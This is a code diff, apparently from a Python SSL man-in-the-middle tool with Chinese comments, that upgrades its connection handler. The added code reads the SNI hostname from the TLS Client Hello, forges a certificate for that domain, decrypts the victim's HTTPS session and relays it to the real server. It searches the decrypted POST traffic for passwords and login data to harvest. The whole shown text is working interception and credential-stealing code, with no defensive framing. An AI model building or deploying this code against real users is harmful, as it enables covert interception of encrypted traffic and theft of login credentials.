@@ -166,61 +166,231 @@ class SSLMitm:
         
         return cert, private_key
     
+    def _extract_sni(self, client_hello):
+        """從TLS Client Hello中提取SNI（Server Name Indication）"""
+        try:
+            # TLS記錄層：跳過記錄頭（5字節）
+            if len(client_hello) < 5:
+                return None
+            
+            # 檢查是否為Handshake記錄（0x16）
+            if client_hello[0] != 0x16:
+                return None
+            
+            # 跳過TLS記錄頭，找到Handshake消息
+            # 記錄長度在字節2-4
+            record_length = (client_hello[3] << 8) | client_hello[4]
+            
+            if len(client_hello) < 5 + record_length:
+                return None
+            
+            handshake = client_hello[5:]
+            
+            # 檢查是否為Client Hello（0x01）
+            if len(handshake) < 1 or handshake[0] != 0x01:
+                return None
+            
+            # 跳過Handshake消息頭（4字節：類型1字節 + 長度3字節）
+            if len(handshake) < 4:
+                return None
+            
+            client_hello_msg = handshake[4:]
+            
+            # 跳過版本（2字節）+ 隨機數（32字節）+ Session ID長度（1字節）
+            if len(client_hello_msg) < 35:
+                return None
+            
+            offset = 35
+            session_id_length = client_hello_msg[34]
+            offset += session_id_length
+            
+            # 跳過Cipher Suites長度（2字節）
+            if len(client_hello_msg) < offset + 2:
+                return None
+            
+            cipher_suites_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
+            offset += 2 + cipher_suites_length
+            
+            # 跳過Compression Methods長度（1字節）
+            if len(client_hello_msg) < offset + 1:
+                return None
+            
+            compression_methods_length = client_hello_msg[offset]
+            offset += 1 + compression_methods_length
+            
+            # 現在應該在Extensions部分
+            if len(client_hello_msg) < offset + 2:
+                return None
+            
+            extensions_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
+            offset += 2
+            
+            # 遍歷Extensions查找SNI（類型0x0000）
+            ext_end = offset + extensions_length
+            while offset < ext_end and offset + 4 <= len(client_hello_msg):
+                ext_type = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
+                ext_length = (client_hello_msg[offset + 2] << 8) | client_hello_msg[offset + 3]
+                offset += 4
+                
+                if ext_type == 0:  # SNI extension
+                    if len(client_hello_msg) < offset + 2:
+                        break
+                    server_name_list_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
+                    offset += 2
+                    
+                    if len(client_hello_msg) < offset + 3:
+                        break
+                    name_type = client_hello_msg[offset]
+                    name_length = (client_hello_msg[offset + 1] << 8) | client_hello_msg[offset + 2]
+                    offset += 3
+                    
+                    if name_type == 0 and len(client_hello_msg) >= offset + name_length:  # host_name
+                        server_name = client_hello_msg[offset:offset + name_length].decode('utf-8', errors='ignore')
+                        return server_name
+                    break
+                
+                offset += ext_length
+            
+            return None
+        except Exception as e:
+            return None
+    
     def _handle_client(self, client_socket, client_addr):
         """處理客戶端連接"""
         try:
-            # 接收客戶端的SSL握手
-            client_socket.settimeout(10)
+            client_socket.settimeout(30)
             
-            # 讀取客戶端請求
-            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
+            # 接收TLS Client Hello（不進行SSL握手，先讀取原始數據）
+            client_hello = client_socket.recv(4096)
             
-            if not request:
+            if not client_hello:
                 return
             
-            # 解析Host頭
-            host = None
-            for line in request.split('\n'):
-                if line.startswith('Host:'):
-                    host = line.split(':', 1)[1].strip()
-                    break
+            # 從Client Hello中提取SNI
+            host = self._extract_sni(client_hello)
             
             if not host:
-                # 嘗試從SNI獲取
-                # 這裡簡化處理，實際應該解析TLS握手
-                host = "unknown"
+                # 如果無法提取SNI，嘗試其他方法
+                # 可以從iptables重定向的目標IP推斷，但這裡簡化處理
+                print(f"[!] 無法從TLS握手提取SNI，跳過此連接")
+                return
+            
+            # 移除端口號（如果有）
+            if ':' in host:
+                host = host.split(':')[0]
             
             print(f"[*] 處理連接到: {host}")
             
-            # 提取憑證
-            if 'POST' in request and ('password' in request.lower() or 'login' in request.lower()):
-                self._extract_credentials(request, client_addr)
+            # 為該域名生成證書
+            cert, private_key = self._generate_certificate_for_domain(host)
             
-            # 轉發請求到真實服務器
+            # 將證書和私鑰轉換為PEM格式
+            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
+            key_pem = private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            )
+            
+            # 創建臨時證書文件
+            import tempfile
+            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pem') as cert_file:
+                cert_file.write(cert_pem)
+                cert_path = cert_file.name
+            
+            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.key') as key_file:
+                key_file.write(key_pem)
+                key_path = key_file.name
+            
             try:
-                # 連接到真實服務器
+                # 使用我們的證書與客戶端建立SSL連接
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+                context.load_cert_chain(cert_path, key_path)
+                
+                # 將socket包裝為SSL
+                ssl_client = context.wrap_socket(client_socket, server_side=True)
+                
+                # 與真實服務器建立連接
                 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                server_socket.connect((host, 443))
+                server_socket.settimeout(30)
                 
-                # 建立SSL連接
-                context = ssl.create_default_context()
-                ssl_server = context.wrap_socket(server_socket, server_hostname=host)
+                try:
+                    server_socket.connect((host, 443))
+                except socket.gaierror:
+                    # DNS解析失敗，嘗試使用IP地址
+                    import socket as sock
+                    try:
+                        ip = sock.gethostbyname(host)
+                        server_socket.connect((ip, 443))
+                    except:
+                        print(f"[!] 無法連接到 {host}")
+                        return
                 
-                # 轉發請求
-                ssl_server.send(request.encode())
-                response = ssl_server.recv(4096)
+                # 與真實服務器建立SSL連接
+                server_context = ssl.create_default_context()
+                ssl_server = server_context.wrap_socket(server_socket, server_hostname=host)
                 
-                # 轉發回應
-                client_socket.send(response)
+                # 在兩個SSL連接之間轉發數據
+                def forward_data(source, dest, name):
+                    try:
+                        while True:
+                            data = source.recv(4096)
+                            if not data:
+                                break
+                            dest.send(data)
+                            
+                            # 嘗試從解密後的HTTP數據中提取憑證
+                            try:
+                                decoded = data.decode('utf-8', errors='ignore')
+                                if 'POST' in decoded and ('password' in decoded.lower() or 'login' in decoded.lower()):
+                                    self._extract_credentials(decoded, client_addr)
+                            except:
+                                pass
+                    except:
+                        pass
+                
+                # 啟動轉發線程
+                import threading
+                client_to_server = threading.Thread(
+                    target=forward_data,
+                    args=(ssl_client, ssl_server, "client->server"),
+                    daemon=True
+                )
+                server_to_client = threading.Thread(
+                    target=forward_data,
+                    args=(ssl_server, ssl_client, "server->client"),
+                    daemon=True
+                )
+                
+                client_to_server.start()
+                server_to_client.start()
+                
+                # 等待線程結束
+                client_to_server.join(timeout=300)
+                server_to_client.join(timeout=300)
                 
                 ssl_server.close()
-            except Exception as e:
-                print(f"[!] 轉發請求錯誤: {e}")
+                ssl_client.close()
+                
+            finally:
+                # 清理臨時文件
+                try:
+                    os.unlink(cert_path)
+                    os.unlink(key_path)
+                except:
+                    pass
             
+        except ssl.SSLError as e:
+            # SSL錯誤，可能是客戶端拒絕了我們的證書
+            pass
         except Exception as e:
-            print(f"[!] 處理客戶端錯誤: {e}")
+            if "unknown" not in str(e).lower():
+                print(f"[!] 處理客戶端錯誤: {e}")
         finally:
-            client_socket.close()
+            try:
+                client_socket.close()
+            except:
+                pass
     
     def _extract_credentials(self, data, client_addr):
         """從HTTP資料中提取憑證"""
